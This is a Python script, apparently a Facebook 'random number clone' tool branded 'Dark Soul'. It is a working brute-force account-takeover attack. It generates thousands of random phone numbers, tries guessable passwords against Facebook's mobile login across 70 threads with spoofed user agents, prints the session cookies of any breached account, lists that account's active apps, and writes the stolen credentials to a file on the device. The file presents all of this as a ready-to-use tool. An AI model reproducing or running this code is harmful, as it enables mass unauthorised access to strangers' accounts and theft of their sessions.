
import os
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from os import system as _SHAKIB_
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    _SHAKIB_('pip install mechanize requests futures bs4==2 > /dev/null')
    _SHAKIB_('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
def lo(word):
    SHAKIB = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    for i in range(5):
        for x in range(len(SHAKIB)):
            sys.stdout.write(('\r{}{}').format(str(word), SHAKIB[x]))
            time.sleep(0.1)
            sys.stdout.flush()
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://d.facebook.com/itz.ongkon.mallik', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://d.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class SHAKIB:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.006)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
color=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;97m'])
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
_SHAKIB_('xdg-open https://facebook.com/groups/814354150210238/')
import os
def lo(word):
    emran = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    for i in range(5):
        for x in range(len(emran)):
            sys.stdout.write(('\r{}{}').format(str(word), emran[x]))
            time.sleep(0.1)
            sys.stdout.flush()
def logo():
	color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
logo = ("""\033[1;97m   


     ____  ___    ____  __ __    _____ ____  __  ____ 
    / __ \/   |  / __ \/ //_/   / ___// __ \/ / / / / 
   / / / / /| | / /_/ / ,<      \__ \/ / / / / / / /  
  / /_/ / ___ |/ _, _/ /| |    ___/ / /_/ / /_/ / /___
 /_____/_/  |_/_/ |_/_/ |_|   /____/\____/\____/_____/

         


â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘ ð™ð™Šð™Šð™‡ ð™Šð™’ð™‰ð™€ð™ : ð™Žð™ƒð˜¼ð™†ð™„ð˜½          â•‘
â•‘ ð™ð™Šð™Šð™‡ ð™Žð™ð˜¼ð™ð™ð™€ : ð™ð™ð™€ð™€           â•‘
â•‘ ð™ð˜¼ð˜¾ð™€ð˜½ð™Šð™Šð™† : ð™ˆð˜¿ ð™Žð™ƒð˜¼ð™†ð™„ð˜½         â•‘
â•‘ ð™‚ð™„ð™ð™ƒð™ð˜½ : ð™Žð™ƒð˜¼ð™†ð™„ð˜½-ðŸ³ðŸ­           â•‘
â•‘ ð™ð˜¼ð˜¾ð™€ð˜½ð™Šð™Šð™† ð™‚ð™ð™ð™‹ð™€ : ð˜¿ð˜¼ð™ð™† ð™Žð™Šð™ð™‡   â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•


 """)
def linex():
	print(40*'\033[1;97m-')
loop = 0
oks = []
cps = []

def clear():
    _SHAKIB_('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        _SHAKIB_('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
uai = random.choice(["Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)"])
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :shanto = 'âˆš 2009'
        elif uid[:8] in ['10000000']        :shanto = 'âˆš 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = 'âˆš 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
        elif uid[:6] in ['100001']          :shanto = 'âˆš 2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = 'âˆš 2011/2012'
        elif uid[:6] in ['100004']          :shanto = 'âˆš 2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = 'âˆš 2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = 'âˆš 2014/2015'
        elif uid[:6] in ['100009']          :shanto = 'âˆš 2015'
        elif uid[:5] in ['10001']           :shanto = 'âˆš 2015/2016'
        elif uid[:5] in ['10002']           :shanto = 'âˆš 2016/2017'
        elif uid[:5] in ['10003']           :shanto = 'âˆš 2018/2019'
        elif uid[:5] in ['10004']           :shanto = 'âˆš 2019/2020'
        elif uid[:5] in ['10005']           :shanto = 'âˆš 2020'
        elif uid[:5] in ['10006','10007','']:shanto = 'âˆš 2021'
        elif uid[:5] in ['10008']           :shanto = 'âˆš 2022'
        elif uid[:5] in ['10009']           :shanto = 'âˆš 2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = ' âˆš 2008/2009'
    elif len(uid)==8:
        shanto = 'âˆš 2007/2008'
    elif len(uid)==7:
        shanto = 'âˆš 2006/2007'
    else:shanto=''
    return shanto
    
#'Somrat_Ar_Real_Pappa'
#'Somrat_Akta_Bukachoda'   
    
# APK CHECK

def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    _SHAKIB_("clear")
    SHAKIB(logo)
    print("\033[1;97m [01] RANDOM NUMBER CLONE")
    print("\033[1;97m [02] CONTACT WITH ME IN FACEBOOK")
    print("\033[1;97m [03] OUR FACEBOOK GRUPE")
    print("\033[1;97m [04] MY GITHUB")
    print("\033[1;97m [00] EXIT")
    SHAKIB(40*"\033[1;97m-")
    shakibhk = input(f' \033[1;97m CHOOSE : ')
    if shakibhk in ["1","01"]:
    	print("")
    if shakibhk in ["2","02"]:
      _SHAKIB_('xdg-open https://www.facebook.com/DARKSOUL991')
    if shakibhk in ["3","03"]:
    	_SHAKIB_('xdg-open https://facebook.com/groups/814354150210238/')
    if shakibhk in ["4","04"]:
    	_SHAKIB_('xdg-open https://github.com/SHAKIB-71')
    elif shakibhk in ["0","00"]:
    	exit("\033[1;32m BYE MOTHER TOST")
    _SHAKIB_("clear")
    SHAKIB(logo)
    SHAKIB(f' \033[1;97m SIM CODE : 019,017,018,92302,92301,917781')
    SHAKIB(40*"\033[1;97m-")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;97m CHOOSE : ')
    _SHAKIB_('clear')
    print(logo)
    limit = int(input(f' \033[1;97m LIMIT : 5000, 20000, 50000 \n\033[1;97m-------------------------------------------------\n CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    _SHAKIB_("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"  \033[1;92m ð™€ð™‰ð™ð™€ð™ ð™‹ð˜¼ð™Žð™Žð™’ð™Šð™ð˜¿ {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=70) as manshera:
        clear()
        tl = str(len(user))
        print(' \033[1;97mTOTAL ID LIMIT '+tl)
        print(f" \033[1;97mYOU CHOOSE RANDOM NUMBER CLONE")
        print(f" \033[1;97mCLONE STARTING TIME : {dt_string}")
        print(f' \033[1;97mWAIT MOTHER TOST')
        print(f" \033[1;97mSTOP CLONING PRESS CTRL Z")
        SHAKIB(40*"\033[1;97m-")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',            
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Google Chrome";v="112", "Chromium";v="112", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro }
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"""\r\033[1;92m [DARK-OK] {uid} | {ps}\n COOKIE : {coki}\n""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/DARK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
        #        print(f"""\r\033[1;92m [DARK-CP] {uid} | {ps}\n""")
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['SHAKIB','SHAKIB ','SHAKIB '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}DARK-SOUL\33[1;90m]\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m] [OK:{len(oks)}]"),
        sys.stdout.flush()
    except:
        pass
xxr()
